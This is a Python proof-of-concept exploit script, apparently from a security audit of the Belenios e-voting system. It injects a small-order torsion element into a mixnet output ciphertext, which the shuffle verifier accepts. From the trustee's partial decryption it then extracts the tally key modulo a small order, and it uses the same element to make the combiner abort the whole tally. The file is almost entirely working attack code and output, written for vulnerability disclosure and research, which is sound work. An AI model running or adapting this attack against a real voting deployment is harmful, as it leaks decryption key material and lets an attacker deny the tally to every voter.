import time
import random
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "helios"))
import belenios_core as B
import dkg
import mixnet
from common_subgroup import element_of_order, pohlig_hellman_prime_power, crt_combine


class CombinationError(Exception):
    pass


def compute_synthetic_factors(G, ciphertexts, x):
    factors = []
    for ct in ciphertexts:
        if B._pow(ct["alpha"], G.q, G.p) != 1:
            raise CombinationError("InvalidPartialDecryption")
        factors.append(G.pow(ct["alpha"], x))
    return factors


def run():
    print("=" * 74)
    print("Belenios B2 : mixnet torsion injection  (flaw B-V9, and B-V4 as amplifier)")
    print("=" * 74)
    G = B.belenios_group()
    rng = random.Random(5)
    seeds = [B.Password.b58_token(22, rng) for _ in range(1)]
    trustees, Y, s = dkg.run_dkg(G, seeds, 1, rng)

    votes = [1, 0, 1, 0, 1]
    cts = [B.eg_encrypt(G, Y, m, rng)[0] for m in votes]
    perm = list(range(len(cts)))
    rng.shuffle(perm)
    reencs = [G.random_scalar(rng) for _ in cts]
    ee_prime, proof = mixnet.shuffle(G, Y, cts, perm, reencs)
    print("\n[setup] honest re-encryption shuffle of %d ballots; structural proof built." % len(cts))
    print("        verifier gate (mimicking mixnet.ml) accepts honest mix:",
          mixnet.check_shuffle_proof_structure(G, cts, ee_prime, proof))

    print("\n[V9] The verifier applies G.check to cc, cc_hat, tt_hat, t but NEVER to ee/ee'.")
    d = 3
    h = element_of_order(G.p, G.q, (G.p - 1) // G.q, d, 1)
    print("     inject a torsion element h of order %d into output ciphertext #0." % d)
    tainted = mixnet.taint_output(G, ee_prime, 0, h)
    in_subgroup = B._pow(tainted[0]["alpha"], G.q, G.p) == 1
    passes = mixnet.check_shuffle_proof_structure(G, cts, tainted, proof)
    print("     tainted output in order-q subgroup? %s   shuffle verifier accepts it? %s"
          % (in_subgroup, passes))

    print("\n[leak] The trustee partial-decrypts each mixed ciphertext (no subgroup screen).")
    D0 = G.pow(tainted[0]["alpha"], s)
    honest_alpha = ee_prime[0]["alpha"]
    hx = G.mul(D0, G.inv(G.pow(honest_alpha, s)))
    residue = pohlig_hellman_prime_power(G.p, h, hx, d, 1)
    print("     published D0 = (alpha*h)^s carries h^s; small dlog gives s mod %d = %d (true %d)"
          % (d, residue, s % d))

    print("\n[V4] Alternatively, the non-robust combiner turns one tainted factor into a")
    print("     whole-tally denial of service:")
    try:
        compute_synthetic_factors(G, tainted, s)
        print("     combiner produced factors (unexpected)")
    except CombinationError as e:
        print("     compute_synthetic_factors raised CombinationError(%s) -> tally aborts for" % e)
        print("     all voters, although t+1 valid partial decryptions are present.")

    print("\nRESULT: B-V9 lets an out-of-subgroup ciphertext pass the shuffle verifier; its")
    print("        partial decryption leaks the tally key modulo small orders, and paired")
    print("        with B-V4 the same element denies the entire tally.")


if __name__ == "__main__":
    run()
